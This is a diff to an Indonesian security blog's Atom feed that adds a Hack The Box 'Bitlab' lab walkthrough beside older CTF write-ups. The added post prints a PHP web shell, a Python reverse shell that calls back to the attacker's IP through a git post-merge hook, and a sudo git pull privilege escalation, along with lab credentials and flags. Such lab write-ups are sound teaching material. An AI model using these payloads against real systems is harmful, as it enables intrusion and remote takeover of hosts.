@@ -1,5 +1,138 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://bl33dz.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://bl33dz.github.io/" rel="alternate" type="text/html" /><updated>2020-05-04T02:03:49+07:00</updated><id>http://bl33dz.github.io/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; ordinary people&lt;br&gt; interested in linux and programming
-</subtitle><author><name>bl33dz</name></author><entry><title type="html">[JOINTS2020] Writeup Category Web</title><link href="http://bl33dz.github.io/2020/05/04/web-joints.html" rel="alternate" type="text/html" title="[JOINTS2020] Writeup Category Web" /><published>2020-05-04T00:00:00+07:00</published><updated>2020-05-04T00:00:00+07:00</updated><id>http://bl33dz.github.io/2020/05/04/web-joints</id><content type="html" xml:base="http://bl33dz.github.io/2020/05/04/web-joints.html">&lt;p&gt;Setelah beberapa &lt;del&gt;abad&lt;/del&gt; bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-05T14:44:31+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">bl33dz:~#</title><subtitle>bl33dz&lt;br&gt; ordinary people&lt;br&gt; interested in linux and programming
+</subtitle><author><name>bl33dz</name></author><entry><title type="html">[HTB] Bitlab</title><link href="http://localhost:4000/2020/05/05/hackthebox-bitlab.html" rel="alternate" type="text/html" title="[HTB] Bitlab" /><published>2020-05-05T00:00:00+07:00</published><updated>2020-05-05T00:00:00+07:00</updated><id>http://localhost:4000/2020/05/05/hackthebox-bitlab</id><content type="html" xml:base="http://localhost:4000/2020/05/05/hackthebox-bitlab.html">&lt;p&gt;Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.&lt;/p&gt;
+
+&lt;p&gt;Oke, machine ini menggunakan os linux dan ip addressnya adalah 10.10.10.114 dan hal yang pertama kita lakukan adalah ritual scanning dengan nmap untuk ngintip port port yang kebuka&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nmap -sV 10.10.10.114
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-26 10:57 WIB
+Nmap scan report for 10.10.10.114
+Host is up (0.41s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.78 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Result diatas menunjukkan bahwa machine ini memiliki 2 buah port yang terbuka yaitu port 80(http) dan 22(ssh). Yaudah karena dapatnya cuma itu pertama saya lihat lihat port 80nya dulu.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-1.png&quot; alt=&quot;bitlab-1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bisa dilihat bahwa di port tersebut terdapat webapp gitlab. Nah setelah mencoba menelusuri web tersebut terdapat sebuah page agak mencurigakan &lt;a href=&quot;http://10.10.10.114/help/bookmarks.html&quot;&gt;http://10.10.10.114/help/bookmarks.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-2.png&quot; alt=&quot;bitlab-2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nah ketika mencoba mengklik &lt;code class=&quot;highlighter-rouge&quot;&gt;Gitlab Login&lt;/code&gt; tidak ter-redirect kemanapun dan kalau sudah begini view-source lah kuncinya&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;A HREF=&quot;javascript:(function(){ var _0x4b18=[&amp;amp;quot;\x76\x61\x6C\x75\x65&amp;amp;quot;,&amp;amp;quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&amp;amp;quot;,&amp;amp;quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&amp;amp;quot;,&amp;amp;quot;\x63\x6C\x61\x76\x65&amp;amp;quot;,&amp;amp;quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&amp;amp;quot;,&amp;amp;quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&amp;amp;quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()&quot; ADD_DATE=&quot;1554932142&quot;&amp;gt;Gitlab Login&amp;lt;/A&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Disana terdapat javascript function yang digunakan untuk mengubah suatu value tag html. &lt;em&gt;Kok bisa tau?&lt;/em&gt; tau aja sih soalnya punya ilmu dukun. Kebetulan karena namanya &lt;code class=&quot;highlighter-rouge&quot;&gt;Gitlab Login&lt;/code&gt; maka saya akan mengeksekusi javascript tersebut pada form login menggunakan console. (btw decode dulu html_entity-nya)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-3.png&quot; alt=&quot;bitlab-3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nah kan keisi sendiri username sama passwordnya, kalau mau lihat passwordnya bisa inspect element webnya dan ubah type password ke text. Username: &lt;code class=&quot;highlighter-rouge&quot;&gt;clave&lt;/code&gt; dan Password: &lt;code class=&quot;highlighter-rouge&quot;&gt;11des0081x&lt;/code&gt;. Oke langsung saja login dan seperti biasa enumerate webnya. Saya menemukan 2 repository &lt;a href=&quot;http://10.10.10.114/root/profile/&quot;&gt;Profile&lt;/a&gt; dan &lt;a href=&quot;http://10.10.10.114/root/deployer/&quot;&gt;Deployer&lt;/a&gt;. Ketika saya mau mencoba membuka Settings terbuka &lt;a href=&quot;http://10.10.10.114/profile/&quot;&gt;http://10.10.10.114/profile/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah mendapat beberapa hal hal berguna saya menyimpulkan bahwa &lt;a href=&quot;http://10.10.10.114/profile/&quot;&gt;http://10.10.10.114/profile/&lt;/a&gt; isinya sama persis dengan repository &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt; dan pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;deployer&lt;/code&gt; terdapat script php untuk melakukan git pull pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Disini saya langsung mencoba membuat sebuah file di repository file dengan extensi php dan melakukan merge request&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/bitlab-4.png&quot; alt=&quot;bitlab-4.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dan ketika saya coba check ternyata file tersebut berhasil ditambahkan dan singkat cerita akhirnya saya mendapat reverse shell 
+(referensi: &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nc -vlp 1337
+listening on [any] 1337 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to [10.10.14.115] from (UNKNOWN) [10.10.10.114] 48218
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setelah mendapat reverse shell saya teringat sebuah script pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;deployer&lt;/code&gt; tadi&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php://input&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;json_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$repo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;project&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$event&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;event_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;object_attributes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$branch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;object_attributes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;target_branch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;??&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$repo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Profile'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$branch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'master'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$event&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'merge_request'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$state&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'merged'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cd ../profile/; sudo git pull'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nah dari script tersebut terlihat bahwa &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; dapat menjalankan command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo git pull&lt;/code&gt; dan saya mencoba memastikan dengan command &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -l
+Matching Defaults entries for www-data on bitlab:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bitlab:
+    (root) NOPASSWD: /usr/bin/git pull
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Setelah baca sana sini saya akan &lt;del&gt;tidur&lt;/del&gt; langsung melakukan privilege escalation dengan git hook &lt;code class=&quot;highlighter-rouge&quot;&gt;post-merge&lt;/code&gt; 
+(referensi: &lt;a href=&quot;https://stackoverflow.com/a/21338177&quot;&gt;https://stackoverflow.com/a/21338177&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;Oke mulai privilege escalationnya, pertama saya copy folder &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/profile&lt;/code&gt; ke folder &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; dan membuat &lt;code class=&quot;highlighter-rouge&quot;&gt;post-merge&lt;/code&gt; pada .git/hooks&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bitlab:/tmp$ cp -r /var/www/html/profile .
+www-data@bitlab:/tmp$ cd profile
+www-data@bitlab:/tmp/profile$ cd .git 
+www-data@bitlab:/tmp/profile/.git$ ls
+FETCH_HEAD  ORIG_HEAD  config	    hooks  info  objects      refs
+HEAD	    branches   description  index  logs  packed-refs
+www-data@bitlab:/tmp/profile/.git$ cd hooks
+www-data@bitlab:/tmp/profile/.git/hooks$ cat &amp;gt; post-merge &amp;lt;&amp;lt; 'EOF'
+&amp;gt; #!/bin/bash
+&amp;gt; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.115&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+&amp;gt; EOF
+www-data@bitlab:/tmp/profile/.git/hooks$ cat post-merge
+#!/bin/bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.115&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+www-data@bitlab:/tmp/profile/.git/hooks$ chmod +x post-merge
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;em&gt;Bisa dibaca kan?&lt;/em&gt; oke, karena ketika saya git pull ternyata sudah up to date maka saya mencoba melakukan merge pada repository &lt;code class=&quot;highlighter-rouge&quot;&gt;profile&lt;/code&gt; seperti awal tadi dan melakukan &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo git pull&lt;/code&gt; di directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/profile&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bitlab:/tmp/profile$ cp -r /var/www/html/profile/* . # nah pas ini baru diklik merge
+www-data@bitlab:/tmp/profile$ sudo git pull
+remote: Enumerating objects: 1, done.
+remote: Counting objects: 100% (1/1), done.
+remote: Total 1 (delta 0), reused 0 (delta 0)
+Unpacking objects: 100% (1/1), done.
+From ssh://localhost:3022/root/profile
+   c2e2077..5b34904  master     -&amp;gt; origin/master
+Updating c2e2077..5b34904
+Fast-forward
+ hello.php | 3 +++
+ 1 file changed, 3 insertions(+)
+ create mode 100644 hello.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Disini listener saya mendapat respon yang berarti command berhasil dieksekusi&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/htb/gitlab# nc -vlp 1234
+listening on [any] 1234 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to [10.10.14.115] from (UNKNOWN) [10.10.10.114] 49358
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+8d4cc131757957cb68d9a0cddccd587c
+# ls /home
+clave
+# cat /home/clave/user.txt
+1e3fd81ec3aa2f1462370ee3c20b8154
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nahkan langsung dapet dua flag &lt;em&gt;wkwkwk&lt;/em&gt;. Ngomong ngomong writeup ini agak ribet dan untuk yang kurang jelas bisa kontak telegram saya &lt;a href=&quot;https://t.me/bl33dz&quot;&gt;@bl33dz&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Dan kalo bisa &lt;em&gt;Respect&lt;/em&gt; akun hackthebox saya yang ada dibawah ini.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Writeup machine Bitlab ini ditulis setelah writeup machine Craft. Nah karena kebetulan machine ini dah retired jadinya bisa publish post ini. Seperti biasa cerita dikit, menurutku machine ini lebih mirip ke CTF daripada real. Untuk lebih jelasnya simak post ini baik baik.</summary></entry><entry><title type="html">[JOINTS2020] Writeup Category Web</title><link href="http://localhost:4000/2020/05/04/web-joints.html" rel="alternate" type="text/html" title="[JOINTS2020] Writeup Category Web" /><published>2020-05-04T00:00:00+07:00</published><updated>2020-05-04T00:00:00+07:00</updated><id>http://localhost:4000/2020/05/04/web-joints</id><content type="html" xml:base="http://localhost:4000/2020/05/04/web-joints.html">&lt;p&gt;Setelah beberapa &lt;del&gt;abad&lt;/del&gt; bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.&lt;/p&gt;
 
 &lt;p&gt;Karena ternyata bisa nyelesain semua soal category web (&lt;del&gt;sombong dikit&lt;/del&gt;), akhirnya jadilah artikel ke tiga pada blog ini. Berikut adalah daftar challenge category web pada CTF JOINTS 2020.&lt;/p&gt;
 
@@ -194,7 +327,7 @@ Here you go admin : JOINTS20{L333T_k1dz_Pl4y_with_CrLF_and_CORS_31337}
 
 &lt;p&gt;Sekian writeup yang bisa saya tulis, mohon maaf kalau tulisannya jelek soalnya tadi dikejar deadline pengumpulan writeup (mager juga suruh baca ulang). Dan jikalau saya ada salah kata mohon maaf.&lt;/p&gt;
 
-&lt;p&gt;Sampai ketemu di next artikel.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="ctf" /><category term="web" /><category term="xss" /><category term="rce" /><summary type="html">Setelah beberapa abad bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.</summary></entry><entry><title type="html">[HTB] Wall</title><link href="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html" rel="alternate" type="text/html" title="[HTB] Wall" /><published>2019-12-07T00:00:00+07:00</published><updated>2019-12-07T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/07/hackthebox-wall</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/07/hackthebox-wall.html">&lt;p&gt;Ya, akhirnya machine Wall ini retired dan digantikan machine baru &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/220&quot;&gt;Resolute&lt;/a&gt; (Windows) dan  sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.&lt;/p&gt;
+&lt;p&gt;Sampai ketemu di next artikel.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="ctf" /><category term="web" /><category term="xss" /><category term="rce" /><summary type="html">Setelah beberapa abad bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.</summary></entry><entry><title type="html">[HTB] Wall</title><link href="http://localhost:4000/2019/12/07/hackthebox-wall.html" rel="alternate" type="text/html" title="[HTB] Wall" /><published>2019-12-07T00:00:00+07:00</published><updated>2019-12-07T00:00:00+07:00</updated><id>http://localhost:4000/2019/12/07/hackthebox-wall</id><content type="html" xml:base="http://localhost:4000/2019/12/07/hackthebox-wall.html">&lt;p&gt;Ya, akhirnya machine Wall ini retired dan digantikan machine baru &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/220&quot;&gt;Resolute&lt;/a&gt; (Windows) dan  sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.157&lt;/code&gt;. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.&lt;/p&gt;
 
 &lt;p&gt;Pertama, kaya biasa scan scan dulu pake nmap siapa tau nemu jalan &lt;del&gt;ke hatinya&lt;/del&gt; buat dapetin flag.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:~\htb\wall&amp;gt; nmap -sV -sC -sT  10.10.10.157 
@@ -291,7 +424,7 @@ fe6194544f452f62dc905b12f8da8406
 
 &lt;p&gt;Dan akhirnya, sekali dayung 2 flag termiliki. Untuk lebih jelas mengenai &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/libhax.so&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/rootshell&lt;/code&gt; bisa dilihat di link exploit db diatas tadi.&lt;/p&gt;
 
-&lt;p&gt;Oke selesai juga machine ini, dan semoga ga males untuk nulis writeup selanjutnya.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Ya, akhirnya machine Wall ini retired dan digantikan machine baru Resolute (Windows) dan sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP 10.10.10.157. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.</summary></entry><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://bl33dz.github.io/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://bl33dz.github.io/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;
+&lt;p&gt;Oke selesai juga machine ini, dan semoga ga males untuk nulis writeup selanjutnya.&lt;/p&gt;</content><author><name>bl33dz</name></author><category term="hackthebox" /><category term="linux" /><category term="medium" /><summary type="html">Ya, akhirnya machine Wall ini retired dan digantikan machine baru Resolute (Windows) dan sebenernya saya lebih ngarep diganti machine linux tapi apa boleh buat. Oke balik ke machine ini Wall adalah machine yg menggunakan os linux yang memiliki IP 10.10.10.157. Menurut saya sendiri machine wall ini agak agak kaya ctf ya tapi lumayan lah.</summary></entry><entry><title type="html">[VULNHUB] hackNos: Os-hackNos</title><link href="http://localhost:4000/2019/12/02/vulnhub-hacknos.html" rel="alternate" type="text/html" title="[VULNHUB] hackNos: Os-hackNos" /><published>2019-12-02T00:00:00+07:00</published><updated>2019-12-02T00:00:00+07:00</updated><id>http://localhost:4000/2019/12/02/vulnhub-hacknos</id><content type="html" xml:base="http://localhost:4000/2019/12/02/vulnhub-hacknos.html">&lt;p&gt;My first vulnhub writeup, ya ini adalah writeup vulnhub pertama saya dan juga post pertama di blog ini. Sebenarnya saya sudah menulis beberapa writeup machine hackthebox namun karena machine tersebut belum retired jadi belum saya publish.&lt;/p&gt;
 
 &lt;p&gt;Oke, hackNos ini adalah machine yg menggunakan os linux. Untuk info machine ini sendiri bisa diklik link berikut &lt;a href=&quot;https://www.vulnhub.com/entry/hacknos-os-hacknos,401/&quot;&gt;hackNos&lt;/a&gt; lalu download file OVA yg tersedia.&lt;/p&gt;
 
